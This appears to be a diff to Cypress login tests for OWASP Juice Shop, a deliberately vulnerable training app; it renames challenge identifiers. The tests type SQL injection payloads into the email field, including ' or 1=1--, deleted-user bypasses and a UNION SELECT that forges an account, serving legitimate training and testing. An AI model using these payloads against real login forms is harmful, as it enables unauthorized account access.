@@ -3,7 +3,7 @@ describe('/#/login', () => {
     cy.visit('/#/login')
   })
 
-  describe('challenge "loginAdmin"', () => {
+  describe('challenge "loginAdminChallenge"', () => {
     it('should log in Admin with SQLI attack on email field using "\' or 1=1--"', () => {
       cy.get('#email').type("' or 1=1--")
       cy.get('#password').type('a')
@@ -22,7 +22,7 @@ describe('/#/login', () => {
     })
   })
 
-  describe('challenge "loginJim"', () => {
+  describe('challenge "loginJimChallenge"', () => {
     it('should log in Jim with SQLI attack on email field using "jim@<juice-sh.op>\'--"', () => {
       cy.task<string>('GetFromConfig', 'application.domain').then(
         (appDomain: string) => {
@@ -35,7 +35,7 @@ describe('/#/login', () => {
     })
   })
 
-  describe('challenge "loginBender"', () => {
+  describe('challenge "loginBenderChallenge"', () => {
     it('should log in Bender with SQLI attack on email field using "bender@<juice-sh.op>\'--"', () => {
       cy.task<string>('GetFromConfig', 'application.domain').then(
         (appDomain: string) => {
@@ -48,7 +48,7 @@ describe('/#/login', () => {
     })
   })
 
-  describe('challenge "adminCredentials"', () => {
+  describe('challenge "weakPasswordChallenge"', () => {
     it('should be able to log in with original (weak) admin credentials', () => {
       cy.task<string>('GetFromConfig', 'application.domain').then(
         (appDomain: string) => {
@@ -61,7 +61,7 @@ describe('/#/login', () => {
     })
   })
 
-  describe('challenge "loginSupport"', () => {
+  describe('challenge "loginSupportChallenge"', () => {
     it('should be able to log in with original support-team credentials', () => {
       cy.task<string>('GetFromConfig', 'application.domain').then(
         (appDomain: string) => {
@@ -74,7 +74,7 @@ describe('/#/login', () => {
     })
   })
 
-  describe('challenge "loginRapper"', () => {
+  describe('challenge "loginRapperChallenge"', () => {
     it('should be able to log in with original MC SafeSearch credentials', () => {
       cy.task<string>('GetFromConfig', 'application.domain').then(
         (appDomain: string) => {
@@ -87,7 +87,7 @@ describe('/#/login', () => {
     })
   })
 
-  describe('challenge "loginAmy"', () => {
+  describe('challenge "loginAmyChallenge"', () => {
     it('should be able to log in with original Amy credentials', () => {
       cy.task<string>('GetFromConfig', 'application.domain').then(
         (appDomain: string) => {
@@ -100,7 +100,7 @@ describe('/#/login', () => {
     })
   })
 
-  describe('challenge "dlpPasswordSpraying"', () => {
+  describe('challenge "dlpPasswordSprayingChallenge"', () => {
     it('should be able to log in with original Jannik credentials', () => {
       cy.task<string>('GetFromConfig', 'application.domain').then(
         (appDomain: string) => {
@@ -113,7 +113,7 @@ describe('/#/login', () => {
     })
   })
 
-  describe('challenge "twoFactorAuthUnsafeSecretStorage"', () => {
+  describe('challenge "twoFactorAuthUnsafeSecretStorageChallenge"', () => {
     it('should be able to log into a existing 2fa protected account given the right token', () => {
       cy.task<string>('GetFromConfig', 'application.domain').then(
         (appDomain: string) => {
@@ -133,7 +133,7 @@ describe('/#/login', () => {
     })
   })
 
-  describe('challenge "oauthUserPassword"', () => {
+  describe('challenge "oauthUserPasswordChallenge"', () => {
     it('should be able to log in as bjoern.kimminich@gmail.com with base64-encoded email as password', () => {
       cy.get('#email').type('bjoern.kimminich@gmail.com')
       cy.get('#password').type('bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=')
@@ -143,7 +143,7 @@ describe('/#/login', () => {
     })
   })
 
-  describe('challenge "ghostLogin"', () => {
+  describe('challenge "ghostLoginChallenge"', () => {
     it('should be able to log in as chris.pike@juice-sh.op by using "\' or deletedAt IS NOT NULL --"', () => {
       cy.get('#email').type("' or deletedAt IS NOT NULL--")
       cy.get('#password').type('a')
@@ -165,7 +165,8 @@ describe('/#/login', () => {
   describe('challenge "ephemeralAccountant"', () => {
     it('should log in non-existing accountant user with SQLI attack on email field using UNION SELECT payload', () => {
       cy.get('#email').type(
-        "' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--"
+        "' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--",
+        { delay: 1 } // cypress defaults to 10ms delay between keystrokes, which here is nearly 5s of typing the payload...
       )
       cy.get('#password').type('a')
       cy.get('#loginButton').click()
@@ -182,7 +183,7 @@ describe('/#/login', () => {
           cy.get('#loginButton').click()
         }
       )
-      cy.expectChallengeSolved({ challenge: 'Exposed credentials' })
+      cy.expectChallengeSolved({ challenge: 'Exposed Credentials' })
     })
   })
 })
